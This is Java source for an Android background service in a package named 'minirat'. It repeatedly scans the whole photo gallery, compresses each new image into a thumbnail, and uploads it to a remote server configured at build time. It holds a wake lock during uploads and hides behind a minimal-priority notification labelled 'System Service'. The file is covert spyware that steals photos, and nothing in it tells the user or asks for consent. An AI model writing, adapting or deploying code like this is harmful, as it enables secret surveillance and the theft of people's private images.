package com.app.minirat;

import com.app.minirat.BuildConfig;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.PowerManager;
import android.content.pm.ServiceInfo;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.FileDescriptor;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Service extends android.app.Service {
    private static final String TAG = "Service";
    private static final String CHANNEL_ID = "ServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final String SERVER_URL = BuildConfig.DOMAIN_URL;

    // Scan interval: 15 minutes
    private static final long SCAN_INTERVAL_MS = 15 * 60 * 1000L;

    // SharedPreferences key for tracking uploaded image IDs
    private static final String PREFS_NAME = "minirat_prefs";
    private static final String KEY_UPLOADED_IDS = "uploaded_ids";

    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private PowerManager.WakeLock wakeLock;
    private Handler handler;
    private boolean isScanning = false;

    // Container class for media items
    private static class MediaItem {
        final long id;
        final Uri uri;
        final String displayName;

        MediaItem(long id, Uri uri, String displayName) {
            this.id = id;
            this.uri = uri;
            this.displayName = displayName;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");

        // Start as a foreground service (required on Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, createNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, createNotification());
        }

        // Start the periodic scan cycle
        scheduleScan();

        return START_STICKY;
    }

    /**
     * Schedules the next scan cycle. Runs immediately on first call,
     * then repeats every SCAN_INTERVAL_MS.
     */
    private void scheduleScan() {
        handler.post(scanRunnable);
    }

    private final Runnable scanRunnable = new Runnable() {
        @Override
        public void run() {
            if (!isScanning) {
                runScanCycle();
            }
            // Schedule next scan regardless
            handler.postDelayed(this, SCAN_INTERVAL_MS);
        }
    };

    /**
     * One scan cycle: check server → scan gallery → upload new images.
     */
    private void runScanCycle() {
        executor.execute(() -> {
            isScanning = true;

            // Acquire WakeLock to keep CPU active during upload
            acquireWakeLock();

            try {
                // Step 1: Check if server is reachable
                if (!isServerReachable()) {
                    Log.d(TAG, "Server not reachable, skipping scan cycle");
                    return;
                }

                Log.d(TAG, "Server is reachable, starting scan");

                // Step 2: Get already-uploaded IDs
                Set<String> uploadedIds = getUploadedIds();
                Log.d(TAG, "Already uploaded: " + uploadedIds.size() + " images");

                // Step 3: Query gallery for all images
                ArrayList<MediaItem> mediaItems = getGalleryFiles();
                Log.d(TAG, "Found " + mediaItems.size() + " total media items");

                // Step 4: Filter to only new (un-uploaded) images
                ArrayList<MediaItem> newItems = new ArrayList<>();
                for (MediaItem item : mediaItems) {
                    if (!uploadedIds.contains(String.valueOf(item.id))) {
                        newItems.add(item);
                    }
                }

                Log.d(TAG, "New images to upload: " + newItems.size());

                // Step 5: Upload each new image
                for (MediaItem item : newItems) {
                    try {
                        String thumbnailBase64 = createThumbnail(item.uri);
                        if (thumbnailBase64 != null) {
                            boolean success = sendThumbnailToServer(item.displayName, thumbnailBase64);
                            if (success) {
                                // Mark as uploaded only on success
                                markAsUploaded(item.id);
                                Log.d(TAG, "Uploaded: " + item.displayName);
                            } else {
                                // Server went down mid-scan, stop this cycle
                                Log.w(TAG, "Upload failed for: " + item.displayName + ", pausing cycle");
                                break;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing: " + item.displayName, e);
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "Error in scan cycle", e);
            } finally {
                isScanning = false;
                releaseWakeLock();
            }
        });
    }

    // ─── Server reachability ───────────────────────────────────────────

    /**
     * Lightweight check: sends a HEAD request to the server.
     * Returns true if the server responds with any status code.
     */
    private boolean isServerReachable() {
        try {
            URL url = new URL(SERVER_URL + "/api/thumbnails");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("HEAD");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            int code = conn.getResponseCode();
            conn.disconnect();
            return code >= 200 && code < 500;
        } catch (Exception e) {
            return false;
        }
    }

    // ─── Deduplication ─────────────────────────────────────────────────

    private Set<String> getUploadedIds() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        return new HashSet<>(prefs.getStringSet(KEY_UPLOADED_IDS, new HashSet<>()));
    }

    private void markAsUploaded(long mediaId) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        Set<String> ids = new HashSet<>(prefs.getStringSet(KEY_UPLOADED_IDS, new HashSet<>()));
        ids.add(String.valueOf(mediaId));
        prefs.edit().putStringSet(KEY_UPLOADED_IDS, ids).apply();
    }

    // ─── WakeLock management ───────────────────────────────────────────

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "minirat:upload");
        wakeLock.acquire(30 * 60 * 1000L); // 30 min timeout safety net
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "WakeLock released");
        }
    }

    // ─── Gallery query ─────────────────────────────────────────────────

    private ArrayList<MediaItem> getGalleryFiles() {
        ArrayList<MediaItem> items = new ArrayList<>();
        queryImages(items);
        return items;
    }

    private void queryImages(ArrayList<MediaItem> items) {
        Cursor cursor = null;
        try {
            String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.MIME_TYPE
            };

            // Query ALL image types — no MIME filter
            cursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC"
            );

            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);

                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idColumn);
                    String displayName = cursor.getString(nameColumn);

                    Uri contentUri = ContentUris.withAppendedId(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);

                    items.add(new MediaItem(id, contentUri, displayName));
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying images", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    // ─── Thumbnail creation ────────────────────────────────────────────

    private String createThumbnail(Uri contentUri) throws IOException {
        ContentResolver resolver = getContentResolver();

        // First pass: decode bounds only to calculate inSampleSize
        BitmapFactory.Options opts = new BitmapFactory.Options();
        opts.inJustDecodeBounds = true;

        ParcelFileDescriptor pfd = resolver.openFileDescriptor(contentUri, "r");
        if (pfd == null) return null;
        BitmapFactory.decodeFileDescriptor(pfd.getFileDescriptor(), null, opts);
        pfd.close();

        int targetSize = 128;
        int inSampleSize = 1;
        if (opts.outHeight > targetSize || opts.outWidth > targetSize) {
            int halfHeight = opts.outHeight / 2;
            int halfWidth = opts.outWidth / 2;
            while ((halfHeight / inSampleSize) >= targetSize
                    && (halfWidth / inSampleSize) >= targetSize) {
                inSampleSize *= 2;
            }
        }

        // Second pass: decode actual bitmap with inSampleSize
        opts.inJustDecodeBounds = false;
        opts.inSampleSize = inSampleSize;

        pfd = resolver.openFileDescriptor(contentUri, "r");
        if (pfd == null) return null;
        Bitmap bitmap = BitmapFactory.decodeFileDescriptor(pfd.getFileDescriptor(), null, opts);
        pfd.close();

        if (bitmap == null) {
            return createPlaceholderThumbnail();
        }

        // Scale down to 128x128 preserving aspect ratio
        float scale = Math.min(
                (float) targetSize / bitmap.getWidth(),
                (float) targetSize / bitmap.getHeight()
        );

        Matrix matrix = new Matrix();
        matrix.postScale(scale, scale);

        Bitmap thumbnail = Bitmap.createBitmap(bitmap, 0, 0,
                bitmap.getWidth(), bitmap.getHeight(), matrix, true);

        if (thumbnail != bitmap) {
            bitmap.recycle();
        }

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        thumbnail.compress(Bitmap.CompressFormat.JPEG, 70, baos);
        byte[] thumbnailBytes = baos.toByteArray();
        baos.close();
        thumbnail.recycle();

        return Base64.encodeToString(thumbnailBytes, Base64.NO_WRAP);
    }

    private String createPlaceholderThumbnail() {
        Bitmap placeholder = Bitmap.createBitmap(128, 128, Bitmap.Config.RGB_565);
        placeholder.eraseColor(0xFFCCCCCC);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        placeholder.compress(Bitmap.CompressFormat.JPEG, 70, baos);
        byte[] placeholderBytes = baos.toByteArray();
        try {
            baos.close();
        } catch (IOException e) {
            Log.e(TAG, "Error closing ByteArrayOutputStream", e);
        }

        placeholder.recycle();

        return Base64.encodeToString(placeholderBytes, Base64.NO_WRAP);
    }

    // ─── Network upload ────────────────────────────────────────────────

    /**
     * Sends a thumbnail to the server. Returns true on success, false on failure.
     */
    private boolean sendThumbnailToServer(String fileName, String thumbnailBase64) {
        try {
            URL url = new URL(SERVER_URL + "/api/upload/thumbnail");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);

            JSONObject payload = new JSONObject();
            payload.put("filename", fileName);
            payload.put("thumbnail", thumbnailBase64);

            byte[] postData = payload.toString().getBytes("UTF-8");
            connection.setFixedLengthStreamingMode(postData.length);

            DataOutputStream dos = new DataOutputStream(connection.getOutputStream());
            dos.write(postData);
            dos.flush();
            dos.close();

            int responseCode = connection.getResponseCode();
            connection.disconnect();

            boolean success = responseCode >= 200 && responseCode < 300;
            Log.d(TAG, "Upload response: " + responseCode + " success=" + success);
            return success;

        } catch (Exception e) {
            Log.e(TAG, "Error sending thumbnail to server", e);
            return false;
        }
    }

    // ─── Notification ──────────────────────────────────────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setSound(null, null);
            channel.setVibrationPattern(new long[]{0});
            channel.setImportance(NotificationManager.IMPORTANCE_MIN);

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(R.drawable.ic_notification)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setAutoCancel(false)
                .setOngoing(true)
                .build();
    }

    // ─── Lifecycle ─────────────────────────────────────────────────────

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service destroyed");
        handler.removeCallbacks(scanRunnable);
        releaseWakeLock();
        executor.shutdownNow();
        super.onDestroy();
    }
}
